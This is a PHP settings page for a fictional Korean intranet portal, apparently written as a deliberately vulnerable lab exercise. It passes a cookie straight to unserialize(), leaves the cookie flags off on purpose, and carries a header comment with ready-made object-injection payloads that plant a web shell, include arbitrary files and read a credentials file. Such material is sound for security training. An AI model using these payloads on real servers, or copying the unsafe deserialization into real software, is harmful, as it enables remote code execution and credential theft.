<?php
/**
 * profile.php — 사용자 환경 설정 페이지
 *
 * [취약 포인트: PHP Object Injection]
 *  쿠키 'user_prefs' 를 base64 디코딩 후 unserialize() 에 직접 전달.
 *  공격자가 Logger / CacheLoader / FileHelper 가젯 객체를 주입하면
 *  __destruct / __wakeup / __toString 이 서버에서 자동 실행됨.
 *
 * ──────────────────────────────────────────────────────
 * [가젯별 공격 페이로드 생성 예시]
 *
 * 1) Logger.__destruct → 웹쉘 생성
 *    php -r '
 *      class Logger {
 *        public $log_file = "/var/www/html/uploads/shell.php";
 *        public $log_data = "<?php system(\$_GET[\"cmd\"]); ?>";
 *        public $append   = false;
 *      }
 *      echo base64_encode(serialize(new Logger()));
 *    '
 *    → 생성된 base64 값을 user_prefs 쿠키에 세팅 후 페이지 방문
 *
 * 2) CacheLoader.__wakeup → 임의 파일 include
 *    php -r '
 *      class CacheLoader {
 *        public $config_path = "/var/www/html/uploads/evil.php";
 *      }
 *      echo base64_encode(serialize(new CacheLoader()));
 *    '
 *
 * 3) FileHelper.__toString → 민감 파일 읽기
 *    php -r '
 *      class FileHelper {
 *        public $filepath   = "/var/www/html/secret/credentials.txt";
 *        public $raw_output = true;
 *      }
 *      echo base64_encode(serialize(new FileHelper()));
 *    '
 * ──────────────────────────────────────────────────────
 */

require_once __DIR__ . '/includes/classes.php';

/* ── 환경 설정 저장 (정상 흐름) ── */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $prefs           = new UserPrefs();
    $prefs->theme    = $_POST['theme']    ?? 'light';
    $prefs->lang     = $_POST['lang']     ?? 'ko';
    $prefs->timezone = $_POST['timezone'] ?? 'Asia/Seoul';

    // 직렬화해서 쿠키에 저장
    setcookie(
        'user_prefs',
        base64_encode(serialize($prefs)),
        time() + 86400 * 30,
        '/',
        '',
        false,  // Secure 플래그 없음 (의도적)
        false   // HttpOnly 없음 (의도적)
    );
    header('Location: profile.php?saved=1');
    exit;
}

/* ── 환경 설정 로드 — 취약한 unserialize ─────────────
   쿠키 값을 검증 없이 바로 unserialize().
   공격자가 임의 클래스 객체를 주입 가능.
   (안전하게 하려면: json_decode 사용 또는 HMAC 서명 검증)
──────────────────────────────────────────────────── */
$prefs = new UserPrefs();   // 기본값

if (!empty($_COOKIE['user_prefs'])) {
    $decoded = base64_decode($_COOKIE['user_prefs']);
    if ($decoded !== false) {
        // ★ 취약점: 사용자 제어 입력에 unserialize() 직접 적용
        $obj = @unserialize($decoded);
        if ($obj instanceof UserPrefs) {
            $prefs = $obj;
        } elseif ($obj !== false) {
            // 가젯 객체도 변수에 담겨 __toString 트리거 가능
            $injected = $obj;
        }
    }
}

$saved = isset($_GET['saved']);
?>
<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>IntraDocs — 환경 설정</title>
  <style>
    body   { font-family:'Segoe UI',sans-serif; margin:0; background:#f4f6fa; color:#222; }
    header { background:#1a3c6e; color:#fff; padding:14px 30px; }
    header h1 { margin:0; font-size:1.3rem; }
    nav    { background:#274e8a; padding:8px 30px; }
    nav a  { color:#cde; text-decoration:none; margin-right:18px; font-size:.95rem; }
    main   { max-width:600px; margin:30px auto; background:#fff;
             border-radius:8px; padding:30px; box-shadow:0 2px 8px rgba(0,0,0,.1); }
    label  { display:block; margin-top:14px; font-weight:600; }
    select, input { width:100%; padding:8px; margin-top:4px; border:1px solid #ccc;
                    border-radius:4px; box-sizing:border-box; }
    button { margin-top:20px; padding:10px 24px; background:#1a3c6e; color:#fff;
             border:none; border-radius:4px; cursor:pointer; }
    .notice { background:#e8f5e9; border-left:4px solid #4caf50; padding:10px 14px;
              margin-bottom:16px; border-radius:4px; }
    .debug  { background:#fff3e0; border-left:4px solid #ff9800; padding:10px 14px;
              margin-top:20px; font-size:.85rem; font-family:monospace; word-break:break-all; }
  </style>
</head>
<body>
<header><h1>IntraDocs — 사내 문서 포털</h1></header>
<nav>
  <a href="index.php">홈</a>
  <a href="profile.php">환경 설정</a>
  <a href="index.php?page=notice">공지사항</a>
</nav>
<main>
  <h2>⚙️ 환경 설정</h2>

  <?php if ($saved): ?>
  <div class="notice">✅ 설정이 저장되었습니다.</div>
  <?php endif; ?>

  <form method="POST">
    <label>테마
      <select name="theme">
        <option value="light" <?= $prefs->theme==='light'?'selected':'' ?>>라이트</option>
        <option value="dark"  <?= $prefs->theme==='dark' ?'selected':'' ?>>다크</option>
      </select>
    </label>
    <label>언어
      <select name="lang">
        <option value="ko" <?= $prefs->lang==='ko'?'selected':'' ?>>한국어</option>
        <option value="en" <?= $prefs->lang==='en'?'selected':'' ?>>English</option>
      </select>
    </label>
    <label>시간대
      <input name="timezone" value="<?= htmlspecialchars($prefs->timezone) ?>">
    </label>
    <button type="submit">저장</button>
  </form>

  <!-- 디버그 패널 (개발용 — 프로덕션에서 제거 안 됨) -->
  <div class="debug">
    <strong>🐛 Debug — 현재 쿠키 user_prefs:</strong><br>
    <?= htmlspecialchars($_COOKIE['user_prefs'] ?? '(없음)') ?><br><br>
    <strong>Unserialized 객체:</strong><br>
    <?php
    // __toString 가젯 트리거: echo + 문자열 컨텍스트
    if (isset($injected)) {
        echo htmlspecialchars((string) $injected);   // FileHelper.__toString 실행
    } else {
        echo htmlspecialchars(print_r($prefs, true));
    }
    ?>
  </div>
</main>
</body>
</html>
